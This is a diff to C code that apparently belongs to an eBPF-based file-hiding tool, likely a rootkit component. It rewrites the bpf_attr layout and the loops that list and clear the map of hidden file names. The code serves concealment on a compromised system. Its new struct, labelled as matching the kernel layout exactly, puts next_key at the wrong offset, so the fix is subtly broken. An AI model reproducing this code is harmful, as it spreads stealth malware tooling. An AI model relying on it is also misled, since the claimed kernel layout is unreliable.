@@ -50,26 +50,29 @@
 #define HIDDEN_FILES_MAX 64
 #define HIDDEN_FILES_SIZE 256
 
-/* bpf_attr union */
+/* bpf_attr - must match kernel layout exactly */
+typedef struct {
+    __u32 map_fd;
+    __u64 key;
+    __u64 value;
+    __u64 flags;
+    __u64 next_key;
+} bpf_elem_attr_t;
+
+typedef struct {
+    __u32 map_type;
+    __u32 key_size;
+    __u32 value_size;
+    __u32 max_entries;
+    __u32 map_flags;
+    __u32 inner_map_fd;
+    __u32 numa_node;
+} bpf_create_attr_t;
+
 typedef union bpf_attr {
-    struct {
-        __u32 map_type;
-        __u32 key_size;
-        __u32 value_size;
-        __u32 max_entries;
-        __u32 map_flags;
-    } create;
-    struct {
-        __u32 map_fd;
-        __u64 key;
-        __u64 value;
-        __u64 flags;
-    } elem;
-    struct {
-        __u32 map_fd;
-        __u64 key;
-        __u64 next_key;
-    } next_key;
+    bpf_create_attr_t create;
+    bpf_elem_attr_t elem;
+    __u8 data[256];
 } bpf_attr_t;
 
 static int running = 1;
@@ -79,9 +82,6 @@ static int hidden_map_fd = -1;
 static int bpf_sys(int cmd, bpf_attr_t *attr)
 {
     int ret = syscall(__NR_bpf, cmd, attr, sizeof(bpf_attr_t));
-    if (ret < 0) {
-        LOG_ERR("bpf syscall %d failed: %d (%s)", cmd, errno, strerror(errno));
-    }
     return ret;
 }
 
@@ -169,24 +169,38 @@ static int remove_hidden_file(const char *name)
 static void list_hidden_files(void)
 {
     LOG("Listing hidden files...");
+    LOG("  map_fd=%d", hidden_map_fd);
     
     char key[HIDDEN_FILES_SIZE] = {};
     char next_key[HIDDEN_FILES_SIZE];
     int count = 0;
     
     while (1) {
-        bpf_attr_t attr = {
-            .next_key.map_fd = hidden_map_fd,
-            .next_key.key = (__u64)(unsigned long)key,
-            .next_key.next_key = (__u64)(unsigned long)next_key,
-        };
+        /* First call with empty key to get first key */
+        memset(next_key, 0, HIDDEN_FILES_SIZE);
+        
+        bpf_attr_t attr = {0};
+        attr.elem.map_fd = hidden_map_fd;
+        attr.elem.key = (__u64)(unsigned long)key;
+        attr.elem.next_key = (__u64)(unsigned long)next_key;
+        
+        LOG("  Calling GET_NEXT_KEY with key='%s'", key);
         
         int ret = bpf_sys(BPF_MAP_GET_NEXT_KEY, &attr);
         if (ret < 0) {
             if (errno == ENOENT) {
-                break;  /* No more keys */
+                LOG("  No more keys, iteration complete");
+                break;
             }
-            LOG_ERR("GET_NEXT_KEY failed: %d", ret);
+            LOG_ERR("GET_NEXT_KEY failed: ret=%d, errno=%d (%s)", ret, errno, strerror(errno));
+            break;
+        }
+        
+        LOG("  GET_NEXT_KEY returned, next_key='%s'", next_key);
+        
+        /* Check if next_key is valid */
+        if (next_key[0] == '\0') {
+            LOG("  next_key is empty, stopping");
             break;
         }
         
@@ -195,11 +209,10 @@ static void list_hidden_files(void)
         
         /* Lookup value */
         __u32 val = 0;
-        bpf_attr_t lookup_attr = {
-            .elem.map_fd = hidden_map_fd,
-            .elem.key = (__u64)(unsigned long)key,
-            .elem.value = (__u64)(unsigned long)&val,
-        };
+        bpf_attr_t lookup_attr = {0};
+        lookup_attr.elem.map_fd = hidden_map_fd;
+        lookup_attr.elem.key = (__u64)(unsigned long)key;
+        lookup_attr.elem.value = (__u64)(unsigned long)&val;
         
         ret = bpf_sys(BPF_MAP_LOOKUP_ELEM, &lookup_attr);
         if (ret == 0) {
@@ -219,14 +232,16 @@ static void clear_hidden_list(void)
     LOG("Clearing all hidden files...");
     
     char key[HIDDEN_FILES_SIZE] = {};
+    char next_key[HIDDEN_FILES_SIZE];
     int count = 0;
     
     while (1) {
-        bpf_attr_t attr = {
-            .next_key.map_fd = hidden_map_fd,
-            .next_key.key = (__u64)(unsigned long)key,
-            .next_key.next_key = (__u64)(unsigned long)key,
-        };
+        memset(next_key, 0, HIDDEN_FILES_SIZE);
+        
+        bpf_attr_t attr = {0};
+        attr.elem.map_fd = hidden_map_fd;
+        attr.elem.key = (__u64)(unsigned long)key;
+        attr.elem.next_key = (__u64)(unsigned long)next_key;
         
         int ret = bpf_sys(BPF_MAP_GET_NEXT_KEY, &attr);
         if (ret < 0) {
@@ -236,11 +251,16 @@ static void clear_hidden_list(void)
             break;
         }
         
+        if (next_key[0] == '\0')
+            break;
+        
+        /* Copy next_key to key */
+        memcpy(key, next_key, HIDDEN_FILES_SIZE);
+        
         /* Delete this key */
-        bpf_attr_t del_attr = {
-            .elem.map_fd = hidden_map_fd,
-            .elem.key = (__u64)(unsigned long)key,
-        };
+        bpf_attr_t del_attr = {0};
+        del_attr.elem.map_fd = hidden_map_fd;
+        del_attr.elem.key = (__u64)(unsigned long)key;
         
         ret = bpf_sys(BPF_MAP_DELETE_ELEM, &del_attr);
         if (ret >= 0) {
